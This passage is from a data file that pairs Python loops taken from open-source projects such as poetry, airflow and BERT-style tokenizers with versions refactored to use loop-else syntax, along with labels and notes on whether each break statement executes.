          if start > 0:
            substr = ""##"" + six.ensure_str(substr)
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_str(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
Senta,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Senta/senta/data/tokenizer/tokenization_utils.py,https://github.com/baidu/Senta/tree/master/senta/data/tokenizer/tokenization_utils.py,PreTrainedWordpieceTokenizer,tokenize$299,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.

    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.

    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]

    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.

    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
          if start > 0:
            substr = ""##"" + six.ensure_str(substr)
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_str(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_str(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_str(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
NeuralBabyTalk,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/NeuralBabyTalk/misc/dataloader_coco.py,https://github.com/jiasenlu/NeuralBabyTalk/tree/master/misc/dataloader_coco.py,DataLoader,__getitem__$189,"def __getitem__(self, index):
        ix = self.split_ix[index]

        # load image here.
        image_id = self.info['images'][ix]['id']
        file_path = self.info['images'][ix]['file_path']

        proposal_item =copy.deepcopy(self.dataloader_hdf[ix])
        num_proposal = int(proposal_item['dets_num'])
        num_nms = int(proposal_item['nms_num'])
        proposals = proposal_item['dets_labels']
        proposals = proposals.squeeze()[:num_nms, :]

        coco_split = file_path.split('/')[0]
        # get the ground truth bounding box.
        if coco_split == 'train2014':
            coco = self.coco_train
        else:
            coco = self.coco_val

        bbox_ann_ids = coco.getAnnIds(imgIds=image_id)
        bbox_ann = [{'label': self.ctol[i['category_id']], 'bbox': i['bbox']} for i in coco.loadAnns(bbox_ann_ids)]

        gt_bboxs = np.zeros((len(bbox_ann), 5))
        for i, bbox in enumerate(bbox_ann):
            gt_bboxs[i, :4] = bbox['bbox']
            gt_bboxs[i, 4] = bbox['label']

        # convert from x,y,w,h to x_min, y_min, x_max, y_max
        gt_bboxs[:,2] = gt_bboxs[:,2] + gt_bboxs[:,0]
        gt_bboxs[:,3] = gt_bboxs[:,3] + gt_bboxs[:,1]

        # load the image.
        img = Image.open(os.path.join(self.opt.image_path, file_path)).convert('RGB')

        width, height = img.size
        # resize the image.
        img = self.Resize(img)

        if self.split == 'train':
            # resize the gt_bboxs and proposals.
            proposals = utils.resize_bbox(proposals, width, height, self.opt.image_size, self.opt.image_size)
            gt_bboxs = utils.resize_bbox(gt_bboxs, width, height, self.opt.image_size, self.opt.image_size)
        else:
            proposals = utils.resize_bbox(proposals, width, height, self.opt.image_crop_size, self.opt.image_crop_size)
            gt_bboxs = utils.resize_bbox(gt_bboxs, width, height, self.opt.image_crop_size, self.opt.image_crop_size)

        # crop the image and the bounding box.
        img, proposals, gt_bboxs = self.RandomCropWithBbox(img, proposals, gt_bboxs)

        gt_x = (gt_bboxs[:,2]-gt_bboxs[:,0]+1)
        gt_y = (gt_bboxs[:,3]-gt_bboxs[:,1]+1)
        gt_area_nonzero = (((gt_x != 1) & (gt_y != 1)))

        gt_bboxs = gt_bboxs[gt_area_nonzero]
        captions = self.caption_file[ix]

        # given the bbox_ann, and caption, this function determine which word belongs to the detection.
        det_indicator = self.get_det_word(gt_bboxs, captions)

        # fetch the captions
        ncap = len(captions) # number of captions available for this image
        assert ncap > 0, 'an image does not have any label. this can be handled but right now isn\'t'

        # convert caption into sequence label.
        cap_seq = np.zeros([ncap, self.seq_length, 5])
        for i, caption in enumerate(captions):
            j = 0
            k = 0
            while j < len(caption) and j < self.seq_length:
                is_det = False
                for n in range(2, 0, -1):
                    if det_indicator[n][i][j][0] != 0:
                        cap_seq[i,k,0] = det_indicator[n][i][j][0] + self.vocab_size
                        cap_seq[i,k,1] = det_indicator[n][i][j][1]
                        cap_seq[i,k,2] = det_indicator[n][i][j][2]
                        cap_seq[i,k,3] = self.wtoi[caption[j]]
                        cap_seq[i,k,4] = self.wtoi[caption[j]]

                        is_det = True
                        j += n # skip the ngram.
                        break
                if is_det == False:
                    cap_seq[i,k,0] = self.wtoi[caption[j]]
                    cap_seq[i,k,4] = cap_seq[i,k,0]
                    j += 1
                k += 1

        # get the mask of the ground truth bounding box. The data shape is
        # num_caption x num_box x num_seq
        box_mask = np.ones((len(captions), gt_bboxs.shape[0], self.seq_length))
        for i in range(len(captions)):
            for j in range(self.seq_length):
                if cap_seq[i,j,0] > self.vocab_size:
                    box_mask[i,:,j] = ((gt_bboxs[:,4] == (cap_seq[i,j,0]-self.vocab_size)) == 0)

        # get the batch version of the seq and box_mask.
        if ncap < self.seq_per_img:
            seq_batch = np.zeros([self.seq_per_img, self.seq_length, 4])
            mask_batch = np.zeros([self.seq_per_img, gt_bboxs.shape[0], self.seq_length])
            # we need to subsample (with replacement)
            for q in range(self.seq_per_img):
                ixl = random.randint(0,ncap)
                seq_batch[q,:] = cap_seq[ixl,:,:4]
                mask_batch[q,:]=box_mask[ixl]
        else:
            ixl = random.randint(0, ncap - self.seq_per_img)
            seq_batch = cap_seq[ixl:ixl+self.seq_per_img,:,:4]
            mask_batch = box_mask[ixl:ixl+self.seq_per_img]

        input_seq = np.zeros([self.seq_per_img, self.seq_length+1, 4])
        input_seq[:,1:] = seq_batch

        gt_seq = np.zeros([10, self.seq_length])
        gt_seq[:ncap,:] = cap_seq[:,:,4]

        # if self.split == 'train':
            # augment the proposal with the gt bounding box.
            # this is just to make sure there exist proposals which labels to 1.
            # gt_bboxs_tmp = np.concatenate((gt_bboxs, np.ones((gt_bboxs.shape[0],1))), axis=1)
            # proposals = np.concatenate((gt_bboxs_tmp, proposals), axis=0)
        # flag = False
        # for cap in captions:
        #     if 'bus' in cap:
        #         flag = True
        # if flag:
        #     img_show = np.array(img)
        #     img_show2 = copy.deepcopy(img_show)
        #     import cv2
        #     for i in range(gt_bboxs.shape[0]):
        #         class_name = self.itoc[int(gt_bboxs[i, 4])]
        #         bbox = tuple(int(np.round(x)) for x in gt_bboxs[i, :4])
        #         cv2.rectangle(img_show, bbox[0:2], bbox[2:4], (0, 204, 0), 2)
        #         cv2.putText(img_show, '%s: %.3f' % (class_name, 1), (bbox[0], bbox[1] + 15), cv2.FONT_HERSHEY_PLAIN,
        #                     1.0, (0, 0, 255), thickness=1)
        #     cv2.imwrite('gt_boxes.jpg', img_show)

        #     for i in range(proposals.shape[0]):
        #         bbox = tuple(int(np.round(x)) for x in proposals[i, :4])
        #         score =  proposals[i, 5]
        #         class_name = self.itoc[int(proposals[i, 4])]
        #         cv2.rectangle(img_show2, bbox[0:2], bbox[2:4], (0, 204, 0), 2)

        #         cv2.putText(img_show2, '%s: %.3f' % (class_name, score), (bbox[0], bbox[1] + 15), cv2.FONT_HERSHEY_PLAIN,
        #                     1.0, (0, 0, 255), thickness=1)
        #     cv2.imwrite('proposals.jpg', img_show2)

        #     pdb.set_trace()
        # padding the proposals and gt_bboxs
        pad_proposals = np.zeros((self.max_proposal, 6))
        pad_gt_bboxs = np.zeros((self.max_gt_box, 5))
        pad_box_mask = np.ones((self.seq_per_img, self.max_gt_box, self.seq_length+1))

        if self.opt.det_oracle == False:
            num_pps = min(proposals.shape[0], self.max_proposal)
            num_box = min(gt_bboxs.shape[0], self.max_gt_box)

            pad_proposals[:num_pps] = proposals[:num_pps]
            pad_gt_bboxs[:num_box] = gt_bboxs[:num_box]
            pad_box_mask[:,:num_box,1:] = mask_batch[:,:num_box,:]
        else:
            num_pps = min(gt_bboxs.shape[0], self.max_proposal)
            pad_proposals[:num_pps] = np.concatenate((gt_bboxs[:num_pps], np.ones([num_pps,1])),axis=1)
            num_box = min(gt_bboxs.shape[0], self.max_gt_box)
            pad_gt_bboxs[:num_box] = gt_bboxs[:num_box]
            pad_box_mask[:,:num_box,1:] = mask_batch[:,:num_box,:]

        input_seq = torch.from_numpy(input_seq).long()
        gt_seq = torch.from_numpy(gt_seq).long()
        pad_proposals = torch.from_numpy(pad_proposals).float()
        pad_box_mask = torch.from_numpy(pad_box_mask).byte()
        pad_gt_bboxs = torch.from_numpy(pad_gt_bboxs).float()
        num = torch.FloatTensor([ncap, num_pps, num_box])

        if self.opt.cnn_backend == 'vgg16':
            img = np.array(img, dtype='float32')
            img = img[:,:,::-1].copy() # RGB --> BGR
            img -= self.vgg_pixel_mean
            img = torch.from_numpy(img)
            img = img.permute(2, 0, 1).contiguous()
        else:
            img = self.ToTensor(img)
            img = self.res_Normalize(img)

        return img, input_seq, gt_seq, num, pad_proposals, pad_gt_bboxs, pad_box_mask, image_id","for n in range(2, 0, -1):
    if det_indicator[n][i][j][0] != 0:
        cap_seq[i, k, 0] = det_indicator[n][i][j][0] + self.vocab_size
        cap_seq[i, k, 1] = det_indicator[n][i][j][1]
        cap_seq[i, k, 2] = det_indicator[n][i][j][2]
        cap_seq[i, k, 3] = self.wtoi[caption[j]]
        cap_seq[i, k, 4] = self.wtoi[caption[j]]
        is_det = True
        j += n
        break
if is_det == False:
    cap_seq[i, k, 0] = self.wtoi[caption[j]]
    cap_seq[i, k, 4] = cap_seq[i, k, 0]
    j += 1","for n in range(2, 0, -1):
    if det_indicator[n][i][j][0] != 0:
        cap_seq[i, k, 0] = det_indicator[n][i][j][0] + self.vocab_size
        cap_seq[i, k, 1] = det_indicator[n][i][j][1]
        cap_seq[i, k, 2] = det_indicator[n][i][j][2]
        cap_seq[i, k, 3] = self.wtoi[caption[j]]
        cap_seq[i, k, 4] = self.wtoi[caption[j]]
        j += n
        break
else:
    cap_seq[i, k, 0] = self.wtoi[caption[j]]
    cap_seq[i, k, 4] = cap_seq[i, k, 0]
    j += 1","for n in range(2, 0, -1):
    if det_indicator[n][i][j][0] != 0:
        cap_seq[i, k, 0] = det_indicator[n][i][j][0] + self.vocab_size
        cap_seq[i, k, 1] = det_indicator[n][i][j][1]
        cap_seq[i, k, 2] = det_indicator[n][i][j][2]
        cap_seq[i, k, 3] = self.wtoi[caption[j]]
        cap_seq[i, k, 4] = self.wtoi[caption[j]]
        j += n
        break
else:
    cap_seq[i, k, 0] = self.wtoi[caption[j]]
    cap_seq[i, k, 4] = cap_seq[i, k, 0]
    j += 1",1,"for n in range(2, 0, -1):
    if det_indicator[n][i][j][0] != 0:
        cap_seq[i, k, 0] = det_indicator[n][i][j][0] + self.vocab_size
        cap_seq[i, k, 1] = det_indicator[n][i][j][1]
        cap_seq[i, k, 2] = det_indicator[n][i][j][2]
        cap_seq[i, k, 3] = self.wtoi[caption[j]]
        cap_seq[i, k, 4] = self.wtoi[caption[j]]
        is_det = True
        j += n
        break
if is_det == False:
    cap_seq[i, k, 0] = self.wtoi[caption[j]]
    cap_seq[i, k, 4] = cap_seq[i, k, 0]
    j += 1","break statement is executed:None
break statement is not executed:zejun1"
msg-extractor,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/msg-extractor/extract_msg/msg.py,https://github.com/TeamMsgExtractor/msg-extractor/tree/master/extract_msg/msg.py,MSGFile,ExistsTypedProperty$289,"def ExistsTypedProperty(self, id, location = None, _type = None, prefix = True, propertiesInstance = None):
        """"""
        Determines if the stream with the provided id exists in the location specified.
        If no location is specified, the root directory is searched. The return of this
        function is 2 values, the first being a boolean for if anything was found, and
        the second being how many were found.

        Because of how this function works, any folder that contains it's own
        ""__properties_version1.0"" file should have this function called from it's class.
        """"""
        verifyPropertyId(id)
        verifyType(_type)
        id = id.upper()
        if propertiesInstance is None:
            propertiesInstance = self.mainProperties
        prefixList = self.prefixList if prefix else []
        if location is not None:
            prefixList.append(location)
        prefixList = inputToMsgpath(prefixList)
        usableid = id + _type if _type is not None else id
        found_number = 0
        found_streams = []
        for item in self.listDir():
            if len(item) > len(prefixList):
                if item[len(prefixList)].startswith('__substg1.0_' + usableid) and item[len(prefixList)] not in found_streams:
                    found_number += 1
                    found_streams.append(item[len(prefixList)])
        for x in propertiesInstance:
            if x.startswith(usableid):
                already_found = False
                for y in found_streams:
                    if y.endswith(x):
                        already_found = True
                        break
                if not already_found:
                    found_number += 1
        return (found_number > 0), found_number","for y in found_streams:
    if y.endswith(x):
        already_found = True
        break
if not already_found:
    found_number += 1","for y in found_streams:
    if y.endswith(x):
        break
else:
    found_number += 1","for y in found_streams:
    if y.endswith(x):
        break
else:
    found_number += 1",1,"for y in found_streams:
    if y.endswith(x):
        already_found = True
        break
if not already_found:
    found_number += 1","break statement is executed:None
break statement is not executed:zejun1"
ReAgent,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ReAgent/reagent/data/oss_data_fetcher.py,https://github.com/facebookresearch/ReAgent/tree/master/reagent/data/oss_data_fetcher.py,,upload_as_parquet$410,"def upload_as_parquet(df) -> Dataset:
    """"""Generate a random parquet. Fails if cannot generate a non-existent name.""""""

    # get a random tmp name and check if it exists
    sqlCtx = get_spark_session()
    success = False
    for _ in range(MAX_UPLOAD_PARQUET_TRIES):
        suffix = rand_string(length=UPLOAD_PARQUET_TMP_SUFFIX_LEN)
        rand_name = f""tmp_parquet_{suffix}""
        if not sqlCtx.catalog._jcatalog.tableExists(rand_name):
            success = True
            break
    if not success:
        raise Exception(f""Failed to find name after {MAX_UPLOAD_PARQUET_TRIES} tries."")

    # perform the write
    # pyre-fixme[61]: `rand_name` may not be initialized here.
    df.write.mode(""errorifexists"").format(""parquet"").saveAsTable(rand_name)
    # pyre-fixme[61]: `rand_name` may not be initialized here.
    parquet_url = get_table_url(rand_name)
    logger.info(f""Saved parquet to {parquet_url}"")
    return Dataset(parquet_url=parquet_url)","for _ in range(MAX_UPLOAD_PARQUET_TRIES):
    suffix = rand_string(length=UPLOAD_PARQUET_TMP_SUFFIX_LEN)
    rand_name = f'tmp_parquet_{suffix}'
    if not sqlCtx.catalog._jcatalog.tableExists(rand_name):
        success = True
        break
if not success:
    raise Exception(f'Failed to find name after {MAX_UPLOAD_PARQUET_TRIES} tries.')","for _ in range(MAX_UPLOAD_PARQUET_TRIES):
    suffix = rand_string(length=UPLOAD_PARQUET_TMP_SUFFIX_LEN)
    rand_name = f'tmp_parquet_{suffix}'
    if not sqlCtx.catalog._jcatalog.tableExists(rand_name):
        break
else:
    raise Exception(f'Failed to find name after {MAX_UPLOAD_PARQUET_TRIES} tries.')","for _ in range(MAX_UPLOAD_PARQUET_TRIES):
    suffix = rand_string(length=UPLOAD_PARQUET_TMP_SUFFIX_LEN)
    rand_name = f'tmp_parquet_{suffix}'
    if not sqlCtx.catalog._jcatalog.tableExists(rand_name):
        break
else:
    raise Exception(f'Failed to find name after {MAX_UPLOAD_PARQUET_TRIES} tries.')",1,"for _ in range(MAX_UPLOAD_PARQUET_TRIES):
    suffix = rand_string(length=UPLOAD_PARQUET_TMP_SUFFIX_LEN)
    rand_name = f'tmp_parquet_{suffix}'
    if not sqlCtx.catalog._jcatalog.tableExists(rand_name):
        success = True
        break
if not success:
    raise Exception(f'Failed to find name after {MAX_UPLOAD_PARQUET_TRIES} tries.')","break statement is executed:None
break statement is not executed:zejun1"
poetry,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/poetry/src/poetry/puzzle/transaction.py,https://github.com/sheepzh/poetry/tree/master/src/poetry/puzzle/transaction.py,Transaction,calculate_operations$30,"def calculate_operations(
        self, with_uninstalls: bool = True, synchronize: bool = False
    ) -> List[""OperationTypes""]:
        from poetry.installation.operations.install import Install
        from poetry.installation.operations.uninstall import Uninstall
        from poetry.installation.operations.update import Update

        operations: List[""OperationTypes""] = []

        for result_package, priority in self._result_packages:
            installed = False

            for installed_package in self._installed_packages:
                if result_package.name == installed_package.name:
                    installed = True

                    if result_package.version != installed_package.version or (
                        (
                            installed_package.source_type
                            or result_package.source_type != ""legacy""
                        )
                        and not result_package.is_same_package_as(installed_package)
                    ):
                        operations.append(
                            Update(installed_package, result_package, priority=priority)
                        )
                    else:
                        operations.append(
                            Install(result_package).skip(""Already installed"")
                        )

                    break

            if not installed:
                operations.append(Install(result_package, priority=priority))

        if with_uninstalls:
            for current_package in self._current_packages:
                found = False
                for result_package, _ in self._result_packages:
                    if current_package.name == result_package.name:
                        found = True

                        break

                if not found:
                    for installed_package in self._installed_packages:
                        if installed_package.name == current_package.name:
                            operations.append(Uninstall(current_package))

            if synchronize:
                current_package_names = {
                    current_package.name for current_package in self._current_packages
                }
                # We preserve pip/setuptools/wheel when not managed by poetry, this is done
                # to avoid externally managed virtual environments causing unnecessary
                # removals.
                preserved_package_names = {
                    ""pip"",
                    ""setuptools"",
                    ""wheel"",
                } - current_package_names

                for installed_package in self._installed_packages:
                    if (
                        self._root_package
                        and installed_package.name == self._root_package.name
                    ):
                        continue

                    if installed_package.name in preserved_package_names:
                        continue

                    if installed_package.name not in current_package_names:
                        operations.append(Uninstall(installed_package))

        return sorted(
            operations,
            key=lambda o: (
                -o.priority,
                o.package.name,
                o.package.version,
            ),
        )","for installed_package in self._installed_packages:
    if result_package.name == installed_package.name:
        installed = True
        if result_package.version != installed_package.version or ((installed_package.source_type or result_package.source_type != 'legacy') and (not result_package.is_same_package_as(installed_package))):
            operations.append(Update(installed_package, result_package, priority=priority))
        else:
            operations.append(Install(result_package).skip('Already installed'))
        break
if not installed:
    operations.append(Install(result_package, priority=priority))","for installed_package in self._installed_packages:
    if result_package.name == installed_package.name:
        if result_package.version != installed_package.version or ((installed_package.source_type or result_package.source_type != 'legacy') and (not result_package.is_same_package_as(installed_package))):
            operations.append(Update(installed_package, result_package, priority=priority))
        else:
            operations.append(Install(result_package).skip('Already installed'))
        break
else:
    operations.append(Install(result_package, priority=priority))","for installed_package in self._installed_packages:
    if result_package.name == installed_package.name:
        if result_package.version != installed_package.version or ((installed_package.source_type or result_package.source_type != 'legacy') and (not result_package.is_same_package_as(installed_package))):
            operations.append(Update(installed_package, result_package, priority=priority))
        else:
            operations.append(Install(result_package).skip('Already installed'))
        break
else:
    operations.append(Install(result_package, priority=priority))",1,"for installed_package in self._installed_packages:
    if result_package.name == installed_package.name:
        installed = True
        if result_package.version != installed_package.version or ((installed_package.source_type or result_package.source_type != 'legacy') and (not result_package.is_same_package_as(installed_package))):
            operations.append(Update(installed_package, result_package, priority=priority))
        else:
            operations.append(Install(result_package).skip('Already installed'))
        break
if not installed:
    operations.append(Install(result_package, priority=priority))","break statement is executed:None
break statement is not executed:zejun1"
poetry,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/poetry/src/poetry/puzzle/transaction.py,https://github.com/sheepzh/poetry/tree/master/src/poetry/puzzle/transaction.py,Transaction,calculate_operations$30,"def calculate_operations(
        self, with_uninstalls: bool = True, synchronize: bool = False
    ) -> List[""OperationTypes""]:
        from poetry.installation.operations.install import Install
        from poetry.installation.operations.uninstall import Uninstall
        from poetry.installation.operations.update import Update

        operations: List[""OperationTypes""] = []

        for result_package, priority in self._result_packages:
            installed = False

            for installed_package in self._installed_packages:
                if result_package.name == installed_package.name:
                    installed = True

                    if result_package.version != installed_package.version or (
                        (
                            installed_package.source_type
                            or result_package.source_type != ""legacy""
                        )
                        and not result_package.is_same_package_as(installed_package)
                    ):
                        operations.append(
                            Update(installed_package, result_package, priority=priority)
                        )
                    else:
                        operations.append(
                            Install(result_package).skip(""Already installed"")
                        )

                    break

            if not installed:
                operations.append(Install(result_package, priority=priority))

        if with_uninstalls:
            for current_package in self._current_packages:
                found = False
                for result_package, _ in self._result_packages:
                    if current_package.name == result_package.name:
                        found = True

                        break

                if not found:
                    for installed_package in self._installed_packages:
                        if installed_package.name == current_package.name:
                            operations.append(Uninstall(current_package))

            if synchronize:
                current_package_names = {
                    current_package.name for current_package in self._current_packages
                }
                # We preserve pip/setuptools/wheel when not managed by poetry, this is done
                # to avoid externally managed virtual environments causing unnecessary
                # removals.
                preserved_package_names = {
                    ""pip"",
                    ""setuptools"",
                    ""wheel"",
                } - current_package_names

                for installed_package in self._installed_packages:
                    if (
                        self._root_package
                        and installed_package.name == self._root_package.name
                    ):
                        continue

                    if installed_package.name in preserved_package_names:
                        continue

                    if installed_package.name not in current_package_names:
                        operations.append(Uninstall(installed_package))

        return sorted(
            operations,
            key=lambda o: (
                -o.priority,
                o.package.name,
                o.package.version,
            ),
        )","for (result_package, _) in self._result_packages:
    if current_package.name == result_package.name:
        found = True
        break
if not found:
    for installed_package in self._installed_packages:
        if installed_package.name == current_package.name:
            operations.append(Uninstall(current_package))","for (result_package, _) in self._result_packages:
    if current_package.name == result_package.name:
        break
else:
    for installed_package in self._installed_packages:
        if installed_package.name == current_package.name:
            operations.append(Uninstall(current_package))","for (result_package, _) in self._result_packages:
    if current_package.name == result_package.name:
        break
else:
    for installed_package in self._installed_packages:
        if installed_package.name == current_package.name:
            operations.append(Uninstall(current_package))",1,"for (result_package, _) in self._result_packages:
    if current_package.name == result_package.name:
        found = True
        break
if not found:
    for installed_package in self._installed_packages:
        if installed_package.name == current_package.name:
            operations.append(Uninstall(current_package))","break statement is executed:None
break statement is not executed:zejun1"
policy_sentry,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/policy_sentry/policy_sentry/shared/awsdocs.py,https://github.com/salesforce/policy_sentry/tree/master/policy_sentry/shared/awsdocs.py,,header_matches$30,"def header_matches(string, table):
    """"""checks if the string is found in the table header""""""
    headers = [chomp(str(x)).lower() for x in table.find_all(""th"")]
    match_found = False
    for header in headers:
        if string in header:
            match_found = True
            break
    if not match_found:
        return False
    return True","for header in headers:
    if string in header:
        match_found = True
        break
if not match_found:
    return False","for header in headers:
    if string in header:
        break
else:
    return False","for header in headers:
    if string in header:
        break
else:
    return False",1,"for header in headers:
    if string in header:
        match_found = True
        break
if not match_found:
    return False","break statement is executed:None
break statement is not executed:zejun1"
airflow,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/airflow/airflow/cli/commands/task_command.py,https://github.com/apache/airflow/tree/master/airflow/cli/commands/task_command.py,,task_test$425,"def task_test(args, dag=None):
    """"""Tests task for a given dag_id""""""
    # We want to log output from operators etc to show up here. Normally
    # airflow.task would redirect to a file, but here we want it to propagate
    # up to the normal airflow handler.

    settings.MASK_SECRETS_IN_LOGS = True

    handlers = logging.getLogger('airflow.task').handlers
    already_has_stream_handler = False
    for handler in handlers:
        already_has_stream_handler = isinstance(handler, logging.StreamHandler)
        if already_has_stream_handler:
            break
    if not already_has_stream_handler:
        logging.getLogger('airflow.task').propagate = True

    env_vars = {'AIRFLOW_TEST_MODE': 'True'}
    if args.env_vars:
        env_vars.update(args.env_vars)
        os.environ.update(env_vars)

    dag = dag or get_dag(args.subdir, args.dag_id)

    task = dag.get_task(task_id=args.task_id)
    # Add CLI provided task_params to task.params
    if args.task_params:
        passed_in_params = json.loads(args.task_params)
        task.params.update(passed_in_params)

    if task.params:
        task.params.validate()

    ti = _get_ti(task, args.execution_date_or_run_id, create_if_necessary=True)

    try:
        if args.dry_run:
            ti.dry_run()
        else:
            ti.run(ignore_task_deps=True, ignore_ti_state=True, test_mode=True)
    except Exception:
        if args.post_mortem:
            debugger = _guess_debugger()
            debugger.post_mortem()
        else:
            raise
    finally:
        if not already_has_stream_handler:
            # Make sure to reset back to normal. When run for CLI this doesn't
            # matter, but it does for test suite
            logging.getLogger('airflow.task').propagate = False","for handler in handlers:
    already_has_stream_handler = isinstance(handler, logging.StreamHandler)
    if already_has_stream_handler:
        break
if not already_has_stream_handler:
    logging.getLogger('airflow.task').propagate = True","for handler in handlers:
    already_has_stream_handler = isinstance(handler, logging.StreamHandler)
    if already_has_stream_handler:
        break
else:
    logging.getLogger('airflow.task').propagate = True","for handler in handlers:
    already_has_stream_handler = isinstance(handler, logging.StreamHandler)
    if already_has_stream_handler:
        break
else:
    logging.getLogger('airflow.task').propagate = True",1,"for handler in handlers:
    already_has_stream_handler = isinstance(handler, logging.StreamHandler)
    if already_has_stream_handler:
        break
if not already_has_stream_handler:
    logging.getLogger('airflow.task').propagate = True","break statement is executed:None
break statement is not executed:zejun1"
sqlova,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sqlova/bert/tokenization.py,https://github.com/naver/sqlova/tree/master/bert/tokenization.py,WordpieceTokenizer,tokenize$242,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
